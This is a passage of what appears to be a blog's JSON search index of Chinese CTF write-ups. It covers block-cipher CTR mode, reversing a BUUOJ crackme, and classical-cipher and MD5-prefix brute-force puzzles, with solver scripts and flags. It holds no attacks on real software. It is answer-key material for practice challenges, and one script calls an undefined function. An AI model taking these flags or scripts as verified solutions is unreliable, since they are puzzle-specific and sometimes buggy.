src=\"/2022/09/12/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/814105d6cfdb43f69677bd741eae0130.webp\" alt=\"814105d6cfdb43f69677bd741eae0130\"><figcaption aria-hidden=\"true\">814105d6cfdb43f69677bd741eae0130</figcaption>\r\n</figure>\r\n<h3 id=\"ctr-mode\">5. CTR Mode</h3>\r\n<ul>\r\n<li><p>CTR Mode stands for counter mode. As the name is counter, it uses the sequence of numbers as an input for the algorithm. When the block is encrypted, to fill the next register next counter value is used.<br>\r\nNote: the counter value will be incremented by 1.</p></li>\r\n<li><p>For encryption, the first counter is encrypted using a key, and then the plain text is XOR with the encrypted result to form the ciphertext.</p></li>\r\n<li><p>The counter will be incremented by 1 for the next stage, and the same procedure will be followed for all blocks. For decryption, the same sequence will be used. Here to convert ciphertext into plain text, each ciphertext is XOR with the encrypted counter. For the next stage, the counter will be incremented by the same will be repeated for all Ciphertext blocks.</p>\r\n<p><img src=\"/2022/09/12/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/35da82f1f0ca4102ae145acd4994be87.webp\" alt=\"35da82f1f0ca4102ae145acd4994be87\"> 原文来源于：<a href=\"https://www.educba.com/block-cipher-modes-of-operation/\">https://www.educba.com/block-cipher-modes-of-operation/</a></p></li>\r\n</ul>\r\n","categories":["CTF"],"tags":["crypto"]},{"title":"刮开有奖","url":"/2022/09/12/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/","content":"<h2 id=\"题目地址\"><a href=\"https://buuoj.cn/challenges#%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96\">题目地址</a></h2>\r\n<h2 id=\"解题过程\">解题过程</h2>\r\n<h3 id=\"peid查看无壳拖入ida反编译结果如下\">PEID查看无壳，拖入IDA反编译，结果如下：</h3>\r\n<span id=\"more\"></span>\r\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">BOOL __stdcall <span class=\"title\">DialogFunc</span><span class=\"params\">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *v4; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *v5; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// [esp+8h] [ebp-20030h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// [esp+Ch] [ebp-2002Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v9; <span class=\"comment\">// [esp+10h] [ebp-20028h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// [esp+14h] [ebp-20024h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v11; <span class=\"comment\">// [esp+18h] [ebp-20020h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v12; <span class=\"comment\">// [esp+1Ch] [ebp-2001Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v13; <span class=\"comment\">// [esp+20h] [ebp-20018h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v14; <span class=\"comment\">// [esp+24h] [ebp-20014h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v15; <span class=\"comment\">// [esp+28h] [ebp-20010h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v16; <span class=\"comment\">// [esp+2Ch] [ebp-2000Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v17; <span class=\"comment\">// [esp+30h] [ebp-20008h]</span></span><br><span class=\"line\">  CHAR String; <span class=\"comment\">// [esp+34h] [ebp-20004h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v19; <span class=\"comment\">// [esp+35h] [ebp-20003h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v20; <span class=\"comment\">// [esp+36h] [ebp-20002h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v21; <span class=\"comment\">// [esp+37h] [ebp-20001h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v22; <span class=\"comment\">// [esp+38h] [ebp-20000h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v23; <span class=\"comment\">// [esp+39h] [ebp-1FFFFh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v24; <span class=\"comment\">// [esp+3Ah] [ebp-1FFFEh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v25; <span class=\"comment\">// [esp+3Bh] [ebp-1FFFDh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v26; <span class=\"comment\">// [esp+10034h] [ebp-10004h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v27; <span class=\"comment\">// [esp+10035h] [ebp-10003h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v28; <span class=\"comment\">// [esp+10036h] [ebp-10002h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a2 == <span class=\"number\">272</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a2 != <span class=\"number\">273</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (_WORD)a3 == <span class=\"number\">1001</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(&amp;String, <span class=\"number\">0</span>, <span class=\"number\">0xFFFF</span>u);</span><br><span class=\"line\">    <span class=\"built_in\">GetDlgItemTextA</span>(hDlg, <span class=\"number\">1000</span>, &amp;String, <span class=\"number\">0xFFFF</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(&amp;String) == <span class=\"number\">8</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v7 = <span class=\"number\">90</span>;</span><br><span class=\"line\">      v8 = <span class=\"number\">74</span>;</span><br><span class=\"line\">      v9 = <span class=\"number\">83</span>;</span><br><span class=\"line\">      v10 = <span class=\"number\">69</span>;</span><br><span class=\"line\">      v11 = <span class=\"number\">67</span>;</span><br><span class=\"line\">      v12 = <span class=\"number\">97</span>;</span><br><span class=\"line\">      v13 = <span class=\"number\">78</span>;</span><br><span class=\"line\">      v14 = <span class=\"number\">72</span>;</span><br><span class=\"line\">      v15 = <span class=\"number\">51</span>;</span><br><span class=\"line\">      v16 = <span class=\"number\">110</span>;</span><br><span class=\"line\">      v17 = <span class=\"number\">103</span>;</span><br><span class=\"line\">      <span class=\"built_in\">sub_4010F0</span>(&amp;v7, <span class=\"number\">0</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">      <span class=\"built_in\">memset</span>(&amp;v26, <span class=\"number\">0</span>, <span class=\"number\">0xFFFF</span>u);</span><br><span class=\"line\">      v26 = v23;</span><br><span class=\"line\">      v28 = v25;</span><br><span class=\"line\">      v27 = v24;</span><br><span class=\"line\">      v4 = (<span class=\"type\">const</span> <span class=\"type\">char</span> *)<span class=\"built_in\">sub_401000</span>(&amp;v26, <span class=\"built_in\">strlen</span>(&amp;v26));</span><br><span class=\"line\">      <span class=\"built_in\">memset</span>(&amp;v26, <span class=\"number\">0</span>, <span class=\"number\">0xFFFF</span>u);</span><br><span class=\"line\">      v27 = v21;</span><br><span class=\"line\">      v26 = v20;</span><br><span class=\"line\">      v28 = v22;</span><br><span class=\"line\">      v5 = (<span class=\"type\">const</span> <span class=\"type\">char</span> *)<span class=\"built_in\">sub_401000</span>(&amp;v26, <span class=\"built_in\">strlen</span>(&amp;v26));</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( String == v7 + <span class=\"number\">34</span></span><br><span class=\"line\">        &amp;&amp; v19 == v11</span><br><span class=\"line\">        &amp;&amp; <span class=\"number\">4</span> * v20 - <span class=\"number\">141</span> == <span class=\"number\">3</span> * v9</span><br><span class=\"line\">        &amp;&amp; v21 / <span class=\"number\">4</span> == <span class=\"number\">2</span> * (v14 / <span class=\"number\">9</span>)</span><br><span class=\"line\">        &amp;&amp; !<span class=\"built_in\">strcmp</span>(v4, <span class=\"string\">&quot;ak1w&quot;</span>)</span><br><span class=\"line\">        &amp;&amp; !<span class=\"built_in\">strcmp</span>(v5, <span class=\"string\">&quot;V1Ax&quot;</span>) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">MessageBoxA</span>(hDlg, <span class=\"string\">&quot;U g3t 1T!&quot;</span>, <span class=\"string\">&quot;@_@&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (_WORD)a3 != <span class=\"number\">1</span> &amp;&amp; (_WORD)a3 != <span class=\"number\">2</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">EndDialog</span>(hDlg, (<span class=\"type\">unsigned</span> __int16)a3);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>发现关键代码如下： <figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( String == v7 + <span class=\"number\">34</span></span><br><span class=\"line\">        &amp;&amp; v19 == v11</span><br><span class=\"line\">        &amp;&amp; <span class=\"number\">4</span> * v20 - <span class=\"number\">141</span> == <span class=\"number\">3</span> * v9</span><br><span class=\"line\">        &amp;&amp; v21 / <span class=\"number\">4</span> == <span class=\"number\">2</span> * (v14 / <span class=\"number\">9</span>)</span><br><span class=\"line\">        &amp;&amp; !<span class=\"built_in\">strcmp</span>(v4, <span class=\"string\">&quot;ak1w&quot;</span>)</span><br><span class=\"line\">        &amp;&amp; !<span class=\"built_in\">strcmp</span>(v5, <span class=\"string\">&quot;V1Ax&quot;</span>) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">MessageBoxA</span>(hDlg, <span class=\"string\">&quot;U g3t 1T!&quot;</span>, <span class=\"string\">&quot;@_@&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure> 将v4、v5分别与<code>\"ak1w\"</code>、<code>\"V1Ax\"</code>对比，String与v7+34对比，其他类似，从String开始到v25为我方输入，后续对String部分进行变换。 1. sub_4010F0(&amp;v7, 0, 10)函数对v7开始的数组进行排序（升序）， 2. sub_401000函数为base64编码。</p>\r\n<h3 id=\"编写py对其还原\">编写py对其还原：</h3>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">a = [<span class=\"string\">&#x27;Z&#x27;</span>,<span class=\"string\">&#x27;J&#x27;</span>,<span class=\"string\">&#x27;S&#x27;</span>,<span class=\"string\">&#x27;E&#x27;</span>,<span class=\"string\">&#x27;C&#x27;</span>,<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;N&#x27;</span>,<span class=\"string\">&#x27;H&#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>,<span class=\"string\">&#x27;n&#x27;</span>,<span class=\"string\">&#x27;g&#x27;</span>]</span><br><span class=\"line\">a = [<span class=\"built_in\">ord</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> a]</span><br><span class=\"line\">a.sort()</span><br><span class=\"line\">res = []</span><br><span class=\"line\">res.append(<span class=\"built_in\">chr</span>(a[<span class=\"number\">0</span>]+<span class=\"number\">34</span>))                        <span class=\"comment\"># str[0]</span></span><br><span class=\"line\">res.append(<span class=\"built_in\">chr</span>(a[<span class=\"number\">4</span>]))                           <span class=\"comment\"># str[1] = v19</span></span><br><span class=\"line\">res.append( <span class=\"built_in\">chr</span>((a[<span class=\"number\">2</span>] * <span class=\"number\">3</span> + <span class=\"number\">141</span>) // <span class=\"number\">4</span>) )        <span class=\"comment\"># v20</span></span><br><span class=\"line\">res.append(base64.b64decode(<span class=\"string\">&quot;ak1w&quot;</span>).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)[<span class=\"number\">1</span>:])        <span class=\"comment\"># v21-v22</span></span><br><span class=\"line\">res.append(base64.b64decode(<span class=\"string\">&quot;V1Ax&quot;</span>).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))            <span class=\"comment\"># v23-v25</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join(res))</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"得到flagujwmpwp1\">得到flag：UJWMpWP1</h3>\r\n","categories":["CTF"],"tags":["reverse","c/c++"]},{"title":"古典密码题解 1","url":"/2022/09/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E9%A2%98%E8%A7%A3-1/","content":"<h2 id=\"斐波那契\">斐波那契</h2>\r\n<h3 id=\"打开文件发现内容如下\">打开文件发现内容如下</h3>\r\n<span id=\"more\"></span>\r\n<blockquote>\r\n<p>encryption:1,1346269,2,5,8,13,3,21,34,55,89,144,233,377,610,987,2584,4181,6765,1597,10946,17711,28657,46368,75025,121393,196418,317811,514229,832040,2178309,1</p>\r\n<p>cipher:flag{0efa24ed49aa78d97bc2657c4aeaf4ad}</p>\r\n</blockquote>\r\n<h3 id=\"解题\">解题</h3>\r\n<p>发现encrytion后内容为乱序斐波那契数列，长度为32，和flag中内容长度一致，推测需找出encryption对应的编号，然后再对应到flag内容上，编写脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = [<span class=\"number\">1</span>,<span class=\"number\">1346269</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">3</span>,<span class=\"number\">21</span>,<span class=\"number\">34</span>,<span class=\"number\">55</span>,<span class=\"number\">89</span>,<span class=\"number\">144</span>,<span class=\"number\">233</span>,<span class=\"number\">377</span>,<span class=\"number\">610</span>,<span class=\"number\">987</span>,<span class=\"number\">2584</span>,<span class=\"number\">4181</span>,<span class=\"number\">6765</span>,<span class=\"number\">1597</span>,<span class=\"number\">10946</span>,<span class=\"number\">17711</span>,<span class=\"number\">28657</span>,<span class=\"number\">46368</span>,<span class=\"number\">75025</span>,<span class=\"number\">121393</span>,<span class=\"number\">196418</span>,<span class=\"number\">317811</span>,<span class=\"number\">514229</span>,<span class=\"number\">832040</span>,<span class=\"number\">2178309</span>,<span class=\"number\">1</span>]</span><br><span class=\"line\">flag = <span class=\"string\">&#x27;0efa24ed49aa78d97bc2657c4aeaf4ad&#x27;</span></span><br><span class=\"line\">b = s.copy()</span><br><span class=\"line\">b.sort()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(b)</span><br><span class=\"line\">res = [<span class=\"literal\">None</span>] * <span class=\"built_in\">len</span>(s)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(flag)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> res[b.index(s[i])]:</span><br><span class=\"line\">        res[b.index(s[i])] = flag[i]</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        c = (flag[i])</span><br><span class=\"line\">res[res.index(<span class=\"literal\">None</span>)] = c</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join(res))</span><br></pre></td></tr></table></figure>\r\n<p>解得flag如下：<code>0dfea24d49aa78d927bc657c4aeaf4ea</code></p>\r\n<h2 id=\"仿射\">仿射</h2>\r\n<ol type=\"1\">\r\n<li>查看目录，存在两个文件：<code>hint.txt</code>和<code>cipher.txt</code>，内容分别为<code>achjbnpdfherebjsw</code>、<code>b=7</code></li>\r\n<li>解题 根据仿射变换性质：<span class=\"math inline\">\\(C = (a*M+b)\\mod 26\\)</span>，且a与26互素，因此穷举a，便历所有字符，当输出字符为可读单词时，便求得解。编写脚本如下：</li>\r\n</ol>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 仿射</span></span><br><span class=\"line\">cipher = <span class=\"string\">&#x27;achjbnpdfherebjsw&#x27;</span></span><br><span class=\"line\">b = <span class=\"number\">7</span></span><br><span class=\"line\">a_ = [<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>,<span class=\"number\">9</span>,<span class=\"number\">11</span>,<span class=\"number\">15</span>,<span class=\"number\">17</span>,<span class=\"number\">19</span>,<span class=\"number\">21</span>,<span class=\"number\">23</span>,<span class=\"number\">25</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> a_: <span class=\"comment\"># 便历所有a</span></span><br><span class=\"line\">    res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>),<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>)+<span class=\"number\">1</span>): <span class=\"comment\"># 便历所有小写字母，判断进行加密后是否与cipher一致</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((d - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)) * a + b) % <span class=\"number\">26</span> == <span class=\"built_in\">ord</span>(c) - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>):</span><br><span class=\"line\">                res += <span class=\"built_in\">chr</span>(d)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(res) == <span class=\"built_in\">len</span>(cipher):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(a, res)</span><br></pre></td></tr></table></figure>\r\n<p>输出结果为 &gt; 1 tvacugiwyaxkxuclp &gt; &gt; 3 phasycuqiazmzysvf &gt; &gt; 5 jzaqewmukapcpeqxd &gt; &gt; 7 zdaeomqswahuhoejr &gt; &gt; 9 flagisyouareright &gt; &gt; 11 xjamqkwcoavivqmbz &gt; &gt; 15 draokqeymafsfkozb &gt; &gt; 17 vpausicmgajwjsuth &gt; &gt; 19 bxawmokieatgtmwrj &gt; &gt; 21 rbakweogqalylwkdx &gt; &gt; 23 ltaicygksabobcifv &gt; &gt; 25 hfaygusecadqdgypl</p>\r\n<p>因此结果为：<code>flagisyouareright</code>，转换为32位md5后为<code>e8cb7b46bcf72d62e74100dd19bc63c6</code></p>\r\n<h2 id=\"大帝的秘密武器\">大帝的秘密武器</h2>\r\n<h3 id=\"题目\">题目</h3>\r\n<p>请解开以下密文获得合理单词，并使用同样加密方法和加密向量加密以下明文，作为答案提交</p>\r\n<blockquote>\r\n<p>FRPHEVGL</p>\r\n<p>ComeChina</p>\r\n</blockquote>\r\n<h3 id=\"解题-1\">解题</h3>\r\n<p>使用脚本，求得偏移量，然后再进行加密</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 大帝的秘密武器</span></span><br><span class=\"line\">s1 = <span class=\"string\">&#x27;FRPHEVGL&#x27;</span></span><br><span class=\"line\">s2 = <span class=\"string\">&#x27;ComeChina&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt_ks</span>(<span class=\"params\">s: <span class=\"built_in\">str</span>, w: <span class=\"built_in\">int</span></span>) -&gt; <span class=\"built_in\">str</span> :</span><br><span class=\"line\">    res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i.isalpha():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i.islower():</span><br><span class=\"line\">                res += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(i) - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>) + w) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                res += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(i) - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>) + w) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            res += i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\">decrypt_ks(s1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(encrypt_ks(s2, <span class=\"number\">13</span>))</span><br></pre></td></tr></table></figure>\r\n<p>从<code>decrypt_ks</code>可以看出结果为<code>13 security</code>，因此偏移为<code>13</code>，使用encrypt_ks函数，偏移参数为13，加密结果为<code>PbzrPuvan</code></p>\r\n<h2 id=\"残缺的哈希值\">残缺的哈希值</h2>\r\n<h3 id=\"题目-1\">题目</h3>\r\n<p>小明一直将电脑密码的哈希值写在纸上，结果一不小心将墨水撒在了上面，只看得到前10位是c2979c7124，小明只记得密码是4位的数字加字母，你能帮小明恢复密码的哈希值吗？（提示：flag为密码的哈希值）</p>\r\n<h3 id=\"解题-2\">解题</h3>\r\n<p>编写脚本，暴力破解</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\">md5 = <span class=\"string\">&#x27;c2979c7124&#x27;</span></span><br><span class=\"line\">ss = <span class=\"string\">&#x27;0123456789abcdefghjklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> itertools.product(ss, repeat=<span class=\"number\">4</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> hashlib.md5(<span class=\"string\">&#x27;&#x27;</span>.join(s).encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class=\"number\">10</span>] == md5:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(hashlib.md5(<span class=\"string\">&#x27;&#x27;</span>.join(s).encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)).hexdigest())</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\r\n<p>得到flag为：<code>c2979c71244dec2befc6e369941c6546</code></p>\r\n<h2 id=\"浪里淘沙\">浪里淘沙</h2>\r\n<h3 id=\"题目-2\">题目</h3>\r\n<blockquote>\r\n<p>我有密集恐惧症，所以大家自求多福吧，把获得的单词连在一起提交即可。（我这里有一串数字：4，8，11，15，16）</p>\r\n</blockquote>\r\n<p>打开<code>浪里淘沙.txt</code>，发现存在大量英文单词文本，且无空格区分。</p>\r\n<h3 id=\"解题-3\">解题</h3>\r\n<p>使用编辑器手动对单词进行切分（添加空格），然后使用脚本进行统计词频，并按次数从小到大排序，最后将数字作为索引输出单词</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">b = [<span class=\"number\">4</span>,<span class=\"number\">8</span>,<span class=\"number\">11</span>,<span class=\"number\">15</span>,<span class=\"number\">16</span>]</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;D:\\CTF\\CRYPTO\\浪里淘沙\\浪里淘沙.txt&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    text : <span class=\"built_in\">str</span> = f.read()</span><br><span class=\"line\">    l = text.split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(l))</span><br><span class=\"line\">    s = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i != <span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">and</span> i != <span class=\"string\">&#x27; &#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> s.get(i):</span><br><span class=\"line\">                s[i] = <span class=\"number\">0</span></span><br><span class=\"line\">            s[i] += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(s), s)</span><br><span class=\"line\">    res = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> s.items():</span><br><span class=\"line\">        res.append(item)</span><br><span class=\"line\">    res.sort(key = <span class=\"keyword\">lambda</span> x: x[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> b:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(res[j][<span class=\"number\">0</span>],end=<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>\r\n<p>得到flag为：<code>weshouldlearnthecrypto</code></p>\r\n<h2 id=\"easy-crypto\">Easy Crypto</h2>\r\n<h3 id=\"打开文件发现内容如下-1\">打开文件，发现内容如下</h3>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Jxyi yi oekh tqo.Jxyi yi oekh suburhqjyed., qdt jxu vbqw yi vv97v97t5t1ss32t9q5u62s2uu1t2v2s, ikrcyj myjx vbqw qdt &#123;&#125;</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"使用凯撒密码暴力破解\">使用凯撒密码暴力破解</h3>\r\n<p>得到结果为：<code>flag&#123;ff97f97d5d1cc32d9a5e62c2ee1d2f2c&#125;</code></p>\r\n","categories":["CTF"],"tags":["crypto","classical cryptography"]},{"title":"古典密码题解 2","url":"/2022/09/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E9%A2%98%E8%A7%A3-2/","content":"<h2 id=\"凯撒替换\">凯撒？替换？</h2>\r\n<h3 id=\"打开文件\">打开文件</h3>\r\n<span id=\"more\"></span>\r\n<p>发现内容为：<code>MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZO HIXOEOWMEHZO&#125;</code></p>\r\n<p>采用词频分析网站，进行解密，得到结果为<code>flag substitution cipher decryption is always easy just like a piece of cake</code></p>\r\n<p>因此flag为<code>flag&#123;substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake&#125;</code></p>\r\n<h2 id=\"简单刺激小游戏\">简单刺激小游戏</h2>\r\n<ol type=\"1\">\r\n<li>文件内容为<code>f&#123;1calrfesaaE_ygInE&#125;</code>，应该为栅栏密码</li>\r\n<li>使用脚本，得到结果为：<code>flag&#123;raI1fEnce_Easy&#125;</code></li>\r\n</ol>\r\n<h2 id=\"还原大师\">还原大师</h2>\r\n<p>我们得到了一串神秘字符串：<code>TASC?O3RJMV?WDJKX?ZM</code>，中间的问号为未知大写字母，并得到了该字符串的部分MD5为<code>E903???4DAB</code>，请猜出该字符串，并提交MD5作为答案</p>\r\n<p>编写脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\">s = <span class=\"string\">&#x27;TASC?O3RJMV?WDJKX?ZM&#x27;</span></span><br><span class=\"line\">md5 = <span class=\"string\">&#x27;E903???4DAB&#x27;</span>.lower()</span><br><span class=\"line\"><span class=\"keyword\">for</span> j1 <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j2 <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j3 <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">            ss = s[:<span class=\"number\">4</span>]+<span class=\"built_in\">chr</span>(j1)+ s[<span class=\"number\">5</span>:<span class=\"number\">11</span>] + <span class=\"built_in\">chr</span>(j2)+ s[<span class=\"number\">12</span>:<span class=\"number\">17</span>] + <span class=\"built_in\">chr</span>(j3) + s[-<span class=\"number\">2</span>:]</span><br><span class=\"line\">            <span class=\"keyword\">assert</span>(<span class=\"built_in\">len</span>(ss) 